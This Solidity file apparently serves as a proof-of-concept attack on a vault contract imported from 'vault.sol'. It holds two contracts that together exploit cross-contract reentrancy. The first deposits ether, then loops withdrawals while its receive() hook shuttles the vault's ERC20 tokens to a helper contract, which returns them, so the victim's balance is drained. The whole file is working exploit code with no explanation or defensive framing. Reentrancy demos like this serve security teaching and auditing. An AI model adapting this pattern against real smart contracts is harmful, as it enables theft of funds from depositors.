// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./vault.sol";

contract attack_cross_contract_reentrancy {
    cross_contract_reentrancy victim;
    ERC20 ccrt;
    attack2_cross_contract_reentrancy attacker2;
    uint256 amount = 1 ether;

    constructor(address _victim, address _ccrt) {
        victim = cross_contract_reentrancy(_victim);
        ccrt = ERC20(_ccrt);
       
    }
    function setattacker2(address _attacker2) public {
        attacker2 = attack2_cross_contract_reentrancy(_attacker2);
    }

    receive() external payable {
        ccrt.transfer(address(attacker2), msg.value);
    }

    function attack() public payable {
        victim.deposit{value: msg.value}();
        while(address(victim).balance >= amount){
            victim.withdraw();
            attacker2.send(msg.value, address(this));
        }    
    }
}


contract attack2_cross_contract_reentrancy {
    cross_contract_reentrancy victim;
    ERC20 ccrt;
    uint256 amount = 1 ether;

    constructor(cross_contract_reentrancy _victim, ERC20 _ccrt) {
        victim = cross_contract_reentrancy(_victim);
        ccrt = ERC20(_ccrt);
    }

    function send(uint256 _amount, address attacker) public {
        ccrt.transfer(attacker, _amount);
    }
}


